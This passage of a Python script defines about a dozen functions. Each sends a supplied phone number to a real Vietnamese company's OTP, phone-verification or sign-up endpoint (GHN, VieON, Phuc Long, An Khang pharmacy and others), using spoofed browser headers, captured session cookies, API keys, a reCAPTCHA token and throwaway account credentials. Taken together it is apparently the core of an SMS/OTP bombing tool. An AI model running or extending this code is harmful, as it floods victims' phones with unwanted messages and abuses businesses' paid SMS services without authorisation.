        'email': 'trong889@gmail.com',
        'password': '123456789aA@',
    }

    response = requests.post('https://api.popeyes.vn/api/v1/register', cookies=cookies, headers=headers, json=json_data)

    print(response.text)

def gumac(sdt):
    headers = {
        'Accept': 'application/json',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,zh-CN;q=0.4,zh;q=0.3',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
        'Origin': 'https://gumac.vn',
        'Referer': 'https://gumac.vn/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'phone': sdt,
    }

    response = requests.post('https://cms.gumac.vn/api/v1/customers/verify-phone-number', headers=headers, json=json_data)

    print(response.text)

def thefaceshop(sdt):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi',
        'content-type': 'application/json',
        'key': '7d5a5b8c3221344a213de1b5272bbc82',
        'origin': 'https://thefaceshop.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://thefaceshop.com.vn/',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'timestamp': '1722961465214',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
    }

    # Chuyển đổi số điện thoại nếu cần
    if sdt.startswith('0'):
        sdt = '84' + sdt[1:]  # Thay '0' bằng '84'

    # Tạo json_data với số điện thoại đã chuyển đổi
    json_data = {
        'phoneNumber': sdt,
    }
    response = requests.post(
        'https://tfs-api.hsv-tech.io/client/phone-verification/request-verification',
        headers=headers,
        json=json_data,
    )

    print(response.text)

def paynet(sdt):
    cookies = {
        '__RequestVerificationToken': 'dd0VT-xud00ymUzLGUodoIZjXwpLo80XZ0hF4iBif8wL0_gP1P2p3wrRwjJShyMZgAvc4dFxaozwRPerz3Toi17uOZ17qlu4HniZyx_FRhw1',
    }

    headers = {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,zh-CN;q=0.4,zh;q=0.3',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'Cookie': '__RequestVerificationToken=dd0VT-xud00ymUzLGUodoIZjXwpLo80XZ0hF4iBif8wL0_gP1P2p3wrRwjJShyMZgAvc4dFxaozwRPerz3Toi17uOZ17qlu4HniZyx_FRhw1',
        'Origin': 'https://merchant.paynetone.vn',
        'Referer': 'https://merchant.paynetone.vn/User/Create',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'MobileNumber': sdt,
        'IsForget': 'N',
    }

    response = requests.post('https://merchant.paynetone.vn/User/GetOTP', cookies=cookies, headers=headers, data=data, verify=False)

    print(response.text)

def y360(sdt):
    cookies = {
        '_fbp': 'fb.1.1722961443687.349938151157649701',
        'cf_clearance': '.nhb_5MiXa4XkICvu5Q7HxjI80osIzM7T2BNz1koTQY-1722961443-1.0.1.1-kJRa1_1kUhyQPt2S_CFo5Dw29cq1ozFvggRw4xS604CXVcIoAL.lbJSt7cVEuQjMQs7FuhtznthV9EuCWCd8SQ',
        '_ga_M7ZN50PQ1V': 'GS1.1.1722961443.1.1.1722962063.0.0.0',
        '_gid': 'GA1.2.527761745.1722962064',
        '_gat_gtag_UA_211029013_1': '1',
        '_ga': 'GA1.1.1779469652.1722961443',
        '_ga_BS2V9QEV6V': 'GS1.1.1722961443.1.1.1722962090.0.0.0',
        '_gcl_au': '1.1.2120083186.1722961443.927699686.1722962100.1722962113',
    }

    headers = {
        'accept': 'application/json',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,zh-CN;q=0.4,zh;q=0.3',
        'content-type': 'application/json',
        # 'cookie': '_fbp=fb.1.1722961443687.349938151157649701; cf_clearance=.nhb_5MiXa4XkICvu5Q7HxjI80osIzM7T2BNz1koTQY-1722961443-1.0.1.1-kJRa1_1kUhyQPt2S_CFo5Dw29cq1ozFvggRw4xS604CXVcIoAL.lbJSt7cVEuQjMQs7FuhtznthV9EuCWCd8SQ; _ga_M7ZN50PQ1V=GS1.1.1722961443.1.1.1722962063.0.0.0; _gid=GA1.2.527761745.1722962064; _gat_gtag_UA_211029013_1=1; _ga=GA1.1.1779469652.1722961443; _ga_BS2V9QEV6V=GS1.1.1722961443.1.1.1722962090.0.0.0; _gcl_au=1.1.2120083186.1722961443.927699686.1722962100.1722962113',
        'origin': 'https://y360.vn',
        'priority': 'u=1, i',
        'referer': 'https://y360.vn/hoc/register',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
    }

    json_data = {
        'phone': sdt,
        'username': 'sdhsiudu6666@gmail.com',
        'recaptchaToken': '03AFcWeA57FYPTOVDrN6oYPGVNc3np6_r4NpyA_Ozvp8p1L5eIehaGQQXuXDq6nOEWkeEU67Ak7Obt2GggUB_f3ByI7a1SKvOzwMLsv1xKdRcztgQHVSn6u4CwK6_ropAljS3HFLLIh82X2PfHzq5UVK6BHxd6ebYX_1nGDwWPiK1_iOtPjnEyPUEDip-t23OIhT0cehvBWC3UeQs_Ll7GF3SAPnsB-Q6Hv6-WoJUWhlnzVXIbV5vn-JSvsxnuf7L0V9Xi2bp9lEqatt68VLfjgU0JRYJ4AFvYfy0WZgGrM65lOPrzlxelXsr7t9OoRvCMj4-k0c6rRkAt_SZmjUkoyA4qfjFeGwKW3GQZaMzKX3-WMZZ9O_IXVwAaltFz33vGMovOOP20bwxKdg7KHGXBxIgmuMushYhlApk05KDINr-LQ4Ddk8zh0nCXn1kYm5jzhCqPQdCMewr6XdcHa1BeDA08N7wp8ZQ9jlKWCGOc2EC7uPIL2ZUdYpa0vVwR5iZ7ANtvA2oBk6LfZNugSwyIkEx-RHmRA1ktMqn3JGLmfPCQvmwlFoXfDRLo58pzLMqUUr0Rbh0BgQvHs4gsS8Ekc_UDQRRaTK1lMSrlo446df1bKYhLkpdWBTCkBY6Pg3T6C00gzNv5zcaA5PTBN9YrD8iWfT9bluwDwJrIN_BAeDQc_DEqjV8oOSpjuB5jzUMWofnc9gF8ZBQUSIt4GDeCv5MnzmrWRLUm1dutlX0ZQS0XN-hQTzD31_1_D6wHyzAZfqiNcgr35M609ZIUsyoJOJZX86-qpDG2DCRnfUkJN1y9sakdd1IjH-ZpLdCeJ8LLbiANbiVySOSWEcIXysnHULISCBFyzpqKJWyd3G4F_rowpi4mzL7_gyB95lj3nnzoWQuBUwWo1OKW-0JwFEiqoGbpGbdbDpuowGG-l6DH9Akt6xiMN3J3-bIhPb1CCVeUuOgCq7eqbgCMy8HGa7ibOvbWQQYcshIK6t85O1ys3j8bttC8pxDWJXTO1zA3-yor6AaNtIEYMsAs1mIGbVFCZwvQ7H2-6XbBE9Nu16WTu1cM8zGG4qMDaakOMKVK-rz4uDFdgW8pOkgDpeXTc5Cut3q3oYT11IKGKJXqS-l80PxU4URYd6Z2cYOvcHLXEfZNyJblmCemmSrhXexPRmB-DxfJdBey-U-xsiSHEFdF3L_aXNI1S5K3S1r4OX2mvuK6djlHMduBH-fqSI4xW9a-zWb4oF2IjfLyK9Ggx50nzPc7pWtaOtnCdeFnlBcHkr4dUDB2JK1LSmMUVkRh7yjqHpBR7Mazw-2uHDk2xnduHmIdXjmciCOaRkifkDQjh_WJN4d1h9M-kTaCZO3opvqisUrSsJ7Xhl531B6bOPxLizht0YgSHEgn_-8wW31bP106Od6uloet7IDcjNGtwRzyWzn0jXenVd5lXDfVuZtYiGM8uSvWdL0CmeZKzYOihUj_OJIt9BJVxV6BO__2BoTtPG6kpctVDGKfzZvh_syX_jcy1PIbHFqn_Nv7Q8XhJDYVoJ5u1NSo1lK8wYonlFDDFrnNE02wPp-qLn0xCheI37dmjflqf_L95yv3eUbI-eZJK8FYQ5edmLN-4ld17RCK4GZ7t4vjSWYuAbwisve3-UMAqTJhQScOgXz3G9EnOOTXhNpRH8-8rhIx4fkrkQJQ3MPZD5fMblTSEl-n_XJ3735KoWMJVo4SYWoNrqhZd32uesVOijrzqzj5hExzi-e-u-A-U75UPBO_Ak0eQSXMCkTSFV_svdiJqNyruzWGiukBatOshVdxdceh6vPf791XqLoScW7BBPfa27pldVIA6lPGZhEGjeGrqyOE7biI189ZfZJE26p43hqS6sl8EXiebVoftCNGiEdnaw',
    }

    response = requests.post('https://y360.vn/api/v1/user/register', cookies=cookies, headers=headers, json=json_data)

    print(response.text)


def ghn(sdt):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,zh-CN;q=0.4,zh;q=0.3',
        'content-type': 'application/json',
        'origin': 'https://sso.ghn.vn',
        'priority': 'u=1, i',
        'referer': 'https://sso.ghn.vn/',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
    }

    json_data = {
        'phone': sdt,
        'type': 'register',
    }

    response = requests.post('https://online-gateway.ghn.vn/sso/public-api/v2/client/sendotp', headers=headers, json=json_data)

    print(response.text)

def best_inc(sdt):
    headers = {
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,zh-CN;q=0.4,zh;q=0.3',
        'Connection': 'keep-alive',
        'Origin': 'https://best-inc.vn',
        'Referer': 'https://best-inc.vn/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'cross-site',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
        'accept': 'application/json',
        'authorization': 'null',
        'content-type': 'application/json',
        'lang-type': 'vi-VN',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'x-auth-type': 'WEB',
        'x-lan': 'VI',
        'x-nat': 'vi-VN',
        'x-timezone-offset': '7',
    }

    params = {
        'code': '7021748b68f94f611edea71bd79e99fe',
        'instanceId': '700418f7-b7d7-4f24-8cd6-e1160e588e18',
        'validate': '857ad1aa18a1021999a080b4295089bb',
    }

    json_data = {
        'phoneNumber': sdt,
        'verificationCodeType': 1,
    }

    response = requests.post('https://v9-cc.800best.com/uc/account/sendSignUpCode', params=params, headers=headers, json=json_data)

    print(response.text)

def phuclong(sdt):
    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,zh-CN;q=0.4,zh;q=0.3',
        'authorization': 'Bearer undefined',
        'content-type': 'application/json',
        'origin': 'https://order.phuclong.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://order.phuclong.com.vn/',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
        'x-api-key': '25573a6a9b1ee1dacc6805501b93e296c302129a8ceaa1f45b36003490ebb697',
    }

    json_data = {
        'phoneNumber': sdt,
        'fullName': 'ruan',
        'email': 'polokhang0628@gmail.com',
        'password': '7fF.DQWUhYKhn2Q',
    }

    response = requests.post('https://api-crownx.winmart.vn/as/api/plg/v1/user/register', headers=headers, json=json_data)

    print(response.text)

def vieon(sdt):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,zh-CN;q=0.4,zh;q=0.3',
        'authorization': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MjMxMzcwNDcsImp0aSI6IjM5ZjFlYzllNGZiYTRlOWMzNjEwZjUxMGE3ZDk3YzU4IiwiYXVkIjoiIiwiaWF0IjoxNzIyOTY0MjQ3LCJpc3MiOiJWaWVPbiIsIm5iZiI6MTcyMjk2NDI0Niwic3ViIjoiYW5vbnltb3VzXzc1ODNmMGJkZTcyMDc1YTc2ZWYwNzA1ZWMxZmY4MmVhLTgzYzBhMWQxNDk4YzQ3ZGM3MTc0ZjQyNTczMDcwODBjLTE3MjI5NjQyNDciLCJzY29wZSI6ImNtOnJlYWQgY2FzOnJlYWQgY2FzOndyaXRlIGJpbGxpbmc6cmVhZCIsImRpIjoiNzU4M2YwYmRlNzIwNzVhNzZlZjA3MDVlYzFmZjgyZWEtODNjMGExZDE0OThjNDdkYzcxNzRmNDI1NzMwNzA4MGMtMTcyMjk2NDI0NyIsInVhIjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyNy4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiZHQiOiJ3ZWIiLCJtdGgiOiJhbm9ueW1vdXNfbG9naW4iLCJtZCI6IldpbmRvd3MgMTAiLCJpc3ByZSI6MCwidmVyc2lvbiI6IiJ9.i1HSUGCAPHaopJRnV49v-1e-tDYBK6jbnoUBDX-AYpE',
        'content-type': 'application/json',
        'origin': 'https://vieon.vn',
        'priority': 'u=1, i',
        'referer': 'https://vieon.vn/auth/?destination=%2F&utm_source=google&utm_medium=cpc&utm_campaign=approi_VieON_SEM_Brand_BOS_Exact_VieON_ALL_1865B_T_Mainsite03&utm_content=p_--k_vieon',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
    }

    params = {
        'platform': 'web',
        'ui': '012021',
    }

    json_data = {
        'username': sdt,
        'country_code': 'VN',
        'model': 'Windows 10',
        'device_id': '7583f0bde72075a76ef0705ec1ff82ea',
        'device_name': 'Chrome/127',
        'device_type': 'desktop',
        'platform': 'web',
        'ui': '012021',
    }

    response = requests.post('https://api.vieon.vn/backend/user/v2/register', params=params, headers=headers, json=json_data)

    print(response.text)

def medigoapp(sdt):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,zh-CN;q=0.4,zh;q=0.3',
        'content-type': 'application/json',
        'origin': 'https://www.medigoapp.com',
        'priority': 'u=1, i',
        'referer': 'https://www.medigoapp.com/',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
    }

    # Chuyển đổi số điện thoại sang định dạng +84
    if sdt.startswith('0'):
        sdt = '+84' + sdt[1:]
    else:
        sdt = '+84' + sdt

    json_data = {
        'phone': sdt,
    }

    response = requests.post('https://auth.medigoapp.com/prod/getOtp', headers=headers, json=json_data)

    print(response.text)

def nhathuocankhang(sdt):
    cookies = {
        'TBMCookie_3209819802479625248': '203546001722965049soGKtOBkbmKLZuIKlS5j6vZGLTg=',
        '___utmvm': '###########',
        '.AspNetCore.Antiforgery.PgYZnA9bRvk': 'CfDJ8FELQK9dGRNIny3AQ12ZvSlwrPgYisisA25i6AqkB8tkOgAoUWesoBpAPKG2_Rzt3d5YE9PSSFRh9vsyW8KfrGIkStdclBQalZuY6yWpbukDBPSDYdyLDx_iigFfO2uduzc2FA7WE3P7ag-7KijrJPQ',
        'DMX_Personal': '%7B%22CustomerId%22%3A0%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerMail%22%3Anull%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22Address%22%3Anull%2C%22CurrentUrl%22%3Anull%2C%22ProvinceId%22%3A3%2C%22ProvinceName%22%3A%22H%E1%BB%93%20Ch%C3%AD%20Minh%22%2C%22DistrictId%22%3A0%2C%22DistrictType%22%3Anull%2C%22DistrictName%22%3Anull%2C%22WardId%22%3A0%2C%22WardType%22%3Anull%2C%22WardName%22%3Anull%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%2C%22HasLocation%22%3Afalse%7D',
        '___utmvc': "navigator%3Dtrue,navigator.vendor%3DGoogle%20Inc.,navigator.appName%3DNetscape,navigator.plugins.length%3D%3D0%3Dfalse,navigator.platform%3DWin32,navigator.webdriver%3Dfalse,plugin_ext%3Dno%20extention,ActiveXObject%3Dfalse,webkitURL%3Dtrue,_phantom%3Dfalse,callPhantom%3Dfalse,chrome%3Dtrue,yandex%3Dfalse,opera%3Dfalse,opr%3Dfalse,safari%3Dfalse,awesomium%3Dfalse,puffinDevice%3Dfalse,__nightmare%3Dfalse,domAutomation%3Dfalse,domAutomationController%3Dfalse,_Selenium_IDE_Recorder%3Dfalse,document.__webdriver_script_fn%3Dfalse,document.%24cdc_asdjflasutopfhvcZLmcfl_%3Dfalse,process.version%3Dfalse,navigator.cpuClass%3Dfalse,navigator.oscpu%3Dfalse,navigator.connection%3Dtrue,navigator.language%3D%3D'C'%3Dfalse,window.outerWidth%3D%3D0%3Dfalse,window.outerHeight%3D%3D0%3Dfalse,window.WebGLRenderingContext%3Dtrue,document.documentMode%3Dundefined,eval.toString().length%3D33,digest=",
        'MWG_PRODUCT_BASIC_DB': 'B07rYTYR_FknN4ClBvpSR__7McZwjfS8CS5TT_Xe_psiAOsi9Vudaw--',
        'MWG_CART_HAVE_PRODUCT': '',
        'MWG_CART_SS_10': 'CfDJ8HejTqTgEXlOoIeW1CutofPrY3w%2F5SVSmknqpboBYGutL6vYIC1lTX9cvmh8fijOuqxo5XwaZGycD4FB5lul3ITr71vSkC4RhZv0EYGpLxgj2xS9UaV9YIEP%2Behz%2FnYHl0JTf9QcVegVZ8sVnRBavUC6vTYmtzXcKarJWc2myyZo',
        '_gcl_au': '1.1.1407338938.1722965052',
        '_pk_ref.2.b94a': '%5B%22%22%2C%22%22%2C1722965052%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D',
        '_pk_id.2.b94a': '73cda3062e79b5b4.1722965052.',
        '_pk_ses.2.b94a': '1',
        '_ga': 'GA1.1.1591466729.1722965052',
        '__zi': '3000.SSZzejyD5jOgdlk_qHeVpIwL-x_TN1tC99cqyi0I4zHdnQRutm1Hnd7UvwUP2bECEzhle9e85equrgkfdmSNW3ZPfge.1',
        '_fbp': 'fb.1.1722965052387.46358182459851373',
        '_ce.irv': 'new',
        'cebs': '1',
        '_ce.clock_event': '1',
        '_ce.clock_data': '-23%2C1.53.82.41%2C1%2C362d7fe3d8b2581bffa359f0eeda7106%2CChrome%2CVN',
        'SvID': 'ak211|ZrJcQ|ZrJcP',
        '_tt_enable_cookie': '1',
        '_ttp': '7Z4d0_iwOLe3-_Gf2IwJUQ_yrro',
        '.AspNetCore.Antiforgery.NTCLGRwicAo': 'CfDJ8AOPS3HyLgBFlxCZc71KlZMwmjD6Wb46fLoOhAlpjKmd_ljK4P0wWwEJax5OpBs8SjyD7YVCU5PAzcqmNrX5u8yKW6-ceO6QojKxhGA7KDsmpriiQjMTzg64etXypWZFd1pnZCH45DAPfZam1q39_Hs',
        'cebsp_': '2',
        '_ga_D1DPPSN7B8': 'GS1.1.1722965052.1.1.1722965064.48.0.0',
        '_ce.s': 'v~185fb8648365b176bfb0d1af550927bef9ded705~lcw~1722965065593~lva~1722965052490~vpv~0~v11.cs~403690~v11.s~b2c24880-5418-11ef-91ff-430d639aca9e~v11.sla~1722965065869~lcw~1722965065869',
    }

    headers = {
        'Accept': '*/*',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,zh-CN;q=0.4,zh;q=0.3',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'Cookie': "TBMCookie_3209819802479625248=203546001722965049soGKtOBkbmKLZuIKlS5j6vZGLTg=; ___utmvm=###########; .AspNetCore.Antiforgery.PgYZnA9bRvk=CfDJ8FELQK9dGRNIny3AQ12ZvSlwrPgYisisA25i6AqkB8tkOgAoUWesoBpAPKG2_Rzt3d5YE9PSSFRh9vsyW8KfrGIkStdclBQalZuY6yWpbukDBPSDYdyLDx_iigFfO2uduzc2FA7WE3P7ag-7KijrJPQ; DMX_Personal=%7B%22CustomerId%22%3A0%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerMail%22%3Anull%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22Address%22%3Anull%2C%22CurrentUrl%22%3Anull%2C%22ProvinceId%22%3A3%2C%22ProvinceName%22%3A%22H%E1%BB%93%20Ch%C3%AD%20Minh%22%2C%22DistrictId%22%3A0%2C%22DistrictType%22%3Anull%2C%22DistrictName%22%3Anull%2C%22WardId%22%3A0%2C%22WardType%22%3Anull%2C%22WardName%22%3Anull%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%2C%22HasLocation%22%3Afalse%7D; ___utmvc=navigator%3Dtrue,navigator.vendor%3DGoogle%20Inc.,navigator.appName%3DNetscape,navigator.plugins.length%3D%3D0%3Dfalse,navigator.platform%3DWin32,navigator.webdriver%3Dfalse,plugin_ext%3Dno%20extention,ActiveXObject%3Dfalse,webkitURL%3Dtrue,_phantom%3Dfalse,callPhantom%3Dfalse,chrome%3Dtrue,yandex%3Dfalse,opera%3Dfalse,opr%3Dfalse,safari%3Dfalse,awesomium%3Dfalse,puffinDevice%3Dfalse,__nightmare%3Dfalse,domAutomation%3Dfalse,domAutomationController%3Dfalse,_Selenium_IDE_Recorder%3Dfalse,document.__webdriver_script_fn%3Dfalse,document.%24cdc_asdjflasutopfhvcZLmcfl_%3Dfalse,process.version%3Dfalse,navigator.cpuClass%3Dfalse,navigator.oscpu%3Dfalse,navigator.connection%3Dtrue,navigator.language%3D%3D'C'%3Dfalse,window.outerWidth%3D%3D0%3Dfalse,window.outerHeight%3D%3D0%3Dfalse,window.WebGLRenderingContext%3Dtrue,document.documentMode%3Dundefined,eval.toString().length%3D33,digest=; MWG_PRODUCT_BASIC_DB=B07rYTYR_FknN4ClBvpSR__7McZwjfS8CS5TT_Xe_psiAOsi9Vudaw--; MWG_CART_HAVE_PRODUCT=; MWG_CART_SS_10=CfDJ8HejTqTgEXlOoIeW1CutofPrY3w%2F5SVSmknqpboBYGutL6vYIC1lTX9cvmh8fijOuqxo5XwaZGycD4FB5lul3ITr71vSkC4RhZv0EYGpLxgj2xS9UaV9YIEP%2Behz%2FnYHl0JTf9QcVegVZ8sVnRBavUC6vTYmtzXcKarJWc2myyZo; _gcl_au=1.1.1407338938.1722965052; _pk_ref.2.b94a=%5B%22%22%2C%22%22%2C1722965052%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D; _pk_id.2.b94a=73cda3062e79b5b4.1722965052.; _pk_ses.2.b94a=1; _ga=GA1.1.1591466729.1722965052; __zi=3000.SSZzejyD5jOgdlk_qHeVpIwL-x_TN1tC99cqyi0I4zHdnQRutm1Hnd7UvwUP2bECEzhle9e85equrgkfdmSNW3ZPfge.1; _fbp=fb.1.1722965052387.46358182459851373; _ce.irv=new; cebs=1; _ce.clock_event=1; _ce.clock_data=-23%2C1.53.82.41%2C1%2C362d7fe3d8b2581bffa359f0eeda7106%2CChrome%2CVN; SvID=ak211|ZrJcQ|ZrJcP; _tt_enable_cookie=1; _ttp=7Z4d0_iwOLe3-_Gf2IwJUQ_yrro; .AspNetCore.Antiforgery.NTCLGRwicAo=CfDJ8AOPS3HyLgBFlxCZc71KlZMwmjD6Wb46fLoOhAlpjKmd_ljK4P0wWwEJax5OpBs8SjyD7YVCU5PAzcqmNrX5u8yKW6-ceO6QojKxhGA7KDsmpriiQjMTzg64etXypWZFd1pnZCH45DAPfZam1q39_Hs; cebsp_=2; _ga_D1DPPSN7B8=GS1.1.1722965052.1.1.1722965064.48.0.0; _ce.s=v~185fb8648365b176bfb0d1af550927bef9ded705~lcw~1722965065593~lva~1722965052490~vpv~0~v11.cs~403690~v11.s~b2c24880-5418-11ef-91ff-430d639aca9e~v11.sla~1722965065869~lcw~1722965065869",
        'Origin': 'https://www.nhathuocankhang.com',
        'Referer': 'https://www.nhathuocankhang.com/lich-su-mua-hang/dang-nhap',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'phoneNumber': sdt,
        'isReSend': 'false',
        'sendOTPType': '1',
        '__RequestVerificationToken': 'CfDJ8AOPS3HyLgBFlxCZc71KlZOHg1tzDzl8tXewVpOdy69171jcZMdx3_iOm0vtF40HWBiVPAJDMv6MZmvvuGmtn2Mwn3v_-0aU-623OMH57jEgeHbQ9gtnVndHMkjS_CFOlXX0NQhPzZwB1y_vGf4xoiQ',
    }

    response = requests.post(
        'https://www.nhathuocankhang.com/lich-su-mua-hang/LoginV2/GetVerifyCode',
        cookies=cookies,
        headers=headers,
        data=data,
    )

    print(response.text)

def futabus(sdt):
    headers = {
        'accept': 'application/json',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,zh-CN;q=0.4,zh;q=0.3',
        'content-type': 'application/json',
        'origin': 'https://futabus.vn',
        'priority': 'u=1, i',
        'referer': 'https://futabus.vn/',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
